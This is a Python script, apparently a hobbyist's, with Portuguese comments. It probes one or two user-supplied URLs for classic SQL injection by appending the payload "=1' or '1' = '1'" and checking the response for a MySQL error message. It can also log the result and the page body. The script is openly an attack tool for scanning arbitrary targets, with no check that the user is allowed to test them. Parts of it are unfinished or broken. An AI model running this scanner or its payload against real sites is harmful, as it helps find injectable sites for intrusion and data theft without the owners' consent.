#Esse exploit é um lixo.
#Fiz apenas para testar.
#Não ficou bom, eu sei, antes de me xingar de lixo-coder
#Eu sei que o código ta sujo, tmb, obrigado por avisar.
#Mas funciona, o que importa eh isso neh? (Ou não! >_>)
#Me desculpe por esse coco, e por essa afronta contra os programadores ;3
#Obrigado se me desculparem, quem sabe um dia eu aprenda a criar algo q preste =/
#This shit-code was made by : https://www.facebook.com/KiritoKirigayaKazutoKunZ



import sys
import os
import urllib
import urllib.request
import time


f1 = sys.argv[0]





try:
    if sys.argv[1] == "-ajuda":
        os.system('cls')
        print ("Menu de ajuda aberto!: ")
        lerUmArquivo = open ("commands.txt", "r")
        lerSaPorra = lerUmArquivo.read()
        print (lerSaPorra)
        lerUmArquivo.close()
    if sys.argv[1] == "-definir":
        os.system('cls')
        os.system('color c')
        print ("Modo definição ativado! \n\n\n")
        print ("Coloque a url vulnerável e de enter : ")
        alvo = input("\n> ")
        checarFalha = urllib.request.urlopen(alvo + "=1\' or \'1\' = \'1\'")
        lerFalha = checarFalha.read()
        decodificarFalha = lerFalha.decode('utf-8')

        if "You have an error in your SQL syntax" in decodificarFalha:
            os.system('cls')
            print ("Vulneravel a injeção de querys SQL.")
            vulnAlone = "Vulneravel? : SIM"
            print ("Saindo do programa em :")

            time.sleep(5)
            print (time.ctime(5))
           
        else:
            os.system('cls')
            print ("Não é vulneravel a injeção de sql Classica/básica.")
            vulnAlone = "Vulneravel? : NAO"
            time.sleep(5)
        if sys.argv[2] == "-LOG":
            Logz1 = open ("logsite1.txt" , "w")
            Logz1.write(vulnAlone)
            Logz1.write("Alvo : " + decodificarFalha)
            Logz1.close()
    if sys.argv[1] == "-definirVarios":
        os.system('cls')
        os.system('color c')
        print ("Modo definir varios sites ativado! \n\n\n")
        print ("Coloque a url vulneravel e de enter : ")
        alvo1 = input("\n> ")
        os.system('cls')
        print ("Escolha um segundo alvo.")
        alvo2 = input("\n> ")
        os.system('cls')
        print ("2 Alvos escolhidos :\n")
        print (alvo1)
        print (alvo2)
        print ("\n Começar o teste ou escolher mais alvos?")
        print ("\n 1- COMEÇAR ;;;;;;; 2- Escolher mais 2 alvos ;;;;;")
        escolha = str(input("> "))
        if escolha == "1":
            checkFalha = urllib.request.urlopen(alvo1 + "=1\' or \'1\' = \'1\'")
            readarFalha = checkFalha.read()
            decodifyVarias = readarFalha.decode('utf-8')

            checkFalha2 = urllib.request.urlopen(alvo2 + "=1\' or \'1\' = \'1\'")
            readarFalha2 = checkFalha2.read()
            decodifyVarias2 = readarFalha2.decode('utf-8')

            if "You have an error in your SQL syntax" in decodifyVarias:
                os.system('cls')
                print ("Vulneravel a injeção de querys SQL.")
                print ("Alvo : ",alvo1)
                vulneravel1 = "Vulneravel : SIM"
            else:
                os.system('cls')
                print ("Não é vulnerável a injeção de SQL basica.")
                print ("Alvo : ",alvo1)
                vulneravel1 = "Vulneravel : NAO"
            if "You have an error in your SQL syntax" in decodifyVarias2:
                print ("\n\nVulneravel a injeção de querys SQL.")
                print ("Alvo : ", alvo2)
                vulneravel2 = "Vulneravel : SIM"
                alvoVulne = alvo2
            else:
                print ("Não é vulneravel a injeção de SQL basica.")
                vulneravel2 = "Vulneravel : NAO"
       
        if escolha == "2":
            os.system('cls')
            print ("Opção ainda não disponivel.")

        
        
except IndexError:
    os.system('color a')
    os.system('cls')
    print ("Como você não escolheu nenhum argumento, vamos a uma lista deles! \n\n")
    print ("se usar o argumento -definir Você vai fazer o programa definir um alvo!\n")
    print ("após o -definir você digita uma URL alvo.\n")
    print ("Exemplo : py Cexploit.py -definir www.google.com\n")
    print ("Após isso, o programa começara a testar o(s) alvo(s)\n")
    print ("Insira a url exata aonde você suspeita que tenha uma falha SQL/M$SQL/etc.\n")
    print ("Para mais comandos, leia commands.txt \n")

except ValueError:
    os.system('cls')
    os.system('color d')
    print ("Lek, ta parecendo que essa URL ai não ta certa, da uma conferida.")
    print ("A url tem que ser tipo : 'www.testphp.vulnweb.com/listproducts?cat=1")
except urllib.error.URLError:
    os.system('cls')
    os.system('color d')
    print ("Essa url nao pode ser aberta, verifique-a, caso esteja tudo certo \n")
    print ("E se estiver tudo certo, provavelmente tem algum problema com sua internet\n")
    print ("Se a internet tiver OK, tire o HTTPS:// da url.")
    
